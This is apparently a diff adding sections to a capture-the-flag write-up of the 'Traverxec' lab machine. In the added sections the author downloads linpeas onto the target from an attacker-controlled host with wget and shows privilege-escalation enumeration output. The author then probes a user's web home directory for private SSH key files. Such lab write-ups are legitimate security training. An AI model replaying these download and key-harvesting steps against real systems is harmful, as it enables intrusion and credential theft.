@@ -224,6 +224,68 @@ homedirs                /home
 homedirs_public         public_www
 ```
 
+### linpeas
+
+having some problems with this basic shell, eventually got linpeas.sh downloaded with
+```
+wget http://10.10.14.9:7777/linpeas.sh -O /tmp/linpeas.sh 2>&1
+--2022-07-21 12:42:18--  http://10.10.14.9:7777/linpeas.sh
+Connecting to 10.10.14.9:7777... connected.
+HTTP request sent, awaiting response... 200 OK
+...
+```
+
+```
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
+Sudo version 1.8.27
+
+╔══════════╣ Unmounted file-system?
+╚ Check if you can mount unmounted devices
+UUID=b94f39a4-394e-4755-bdc1-205c141583a6 /               ext4    errors=remount-ro 0       1
+UUID=4694341c-5642-4505-8593-0e44d799f109 none            swap    sw              0       0
+/dev/sr0        /media/cdrom0   udf,iso9660 user,noauto     0       0
+
+```
+
+not seeing much here.
+
+### HOMEDIRS
+
+back to the nostromo config, we've got a username and password, but nowhere to use it.
+
+from [https://www.nazgul.ch/dev/nostromo_man.html](https://www.nazgul.ch/dev/nostromo_man.html):
+```
+HOMEDIRS
+     To serve the home directories of your users via HTTP, enable the homedirs
+     option by defining the path in where the home directories are stored,
+     normally /home.  To access a users home directory enter a ~ in the URL
+     followed by the home directory name like in this example:
+
+           http://www.nazgul.ch/~hacki/
+
+     The content of the home directory is handled exactly the same way as a
+     directory in your document root.  If some users don't want that their
+     home directory can be accessed via HTTP, they shall remove the world
+     readable flag on their home directory and a caller will receive a 403
+     Forbidden response.  Also, if basic authentication is enabled, a user can
+     create an .htaccess file in his home directory and a caller will need to
+     authenticate.
+```
+
+and sure enough, `http://traverxec.htb/~david/` gives us new content
+> Private space.
+> Nothing here.
+> Keep out!
+
+me thinks the lady doth protest too much.
+
+but.. `http://traverxec.htb/~david/user.txt` is 404
+
+as are `.ssh/id_dsa` and `.ssh/id_rsa`
+
+we're not getting prompted for auth, or seeing 403s
+
 ## flag
 ```
 user:
